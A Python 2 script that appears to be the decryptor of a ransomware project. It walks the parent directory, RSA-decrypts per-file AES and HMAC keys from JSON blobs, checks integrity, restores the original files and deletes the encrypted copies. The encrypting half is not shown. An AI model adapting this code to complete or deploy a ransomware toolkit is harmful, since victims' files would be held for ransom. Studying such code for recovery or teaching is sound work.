from base64 import b64encode, b64decode
import sys, os, json, requests, cryptools, constants, traceback

OUTSIDE_DIRECTORY = ".."

CIPHER = cryptools.RSADecryptor()

def AESDecrypt(plaintext, AES_KEY, INITIALIZATION_VECTOR):
    cipher = cryptools.FileDecryptor(AES_KEY, INITIALIZATION_VECTOR)
    return cryptools.unpad(cipher.update(plaintext) + cipher.finalize())

def RSADecrypt(plaintext):
    return CIPHER.decrypt(
        plaintext,
        cryptools.oaep()
    ) 

for current_directory, sub_directories, sub_files in os.walk(OUTSIDE_DIRECTORY):
    if 'ransomware' in current_directory.lower():
        continue

    for file in sub_files:
        
        if 'json' not in file:
            continue
        
        try:
            with open(os.path.join(current_directory, file), 'rb') as js:
                json_dict = json.load(js)

            fileName = ''.join(file.split('.')[:-1])
            
            ext = b64decode(json_dict['EXT'])
            tag = b64decode(json_dict['TAG'])
            cipherkeys = b64decode(json_dict['KEY'])
            cipherkeys = RSADecrypt(cipherkeys)
            ciphertext = b64decode(json_dict['CIPHERTEXT'])
        except:
            continue

        aes_key, hmac_key = (cipherkeys[:constants.AES_KEY_LENGTH],\
                            cipherkeys[constants.AES_KEY_LENGTH:])
        
        aes_iv = b64decode(json_dict['IV'])

        if cryptools.HMAC(ciphertext, hmac_key) != tag:
            print '(INTEGRITY COMPRIMISED) CIPHERTEXT HAS BEEN CHANGED FOR %s ' % file
            sys.exit(1)

        with open(os.path.join(current_directory, fileName + '.' + ext), 'wb') as f:
            f.write(AESDecrypt(ciphertext, aes_key, aes_iv))

        os.remove(os.path.join(current_directory, file))
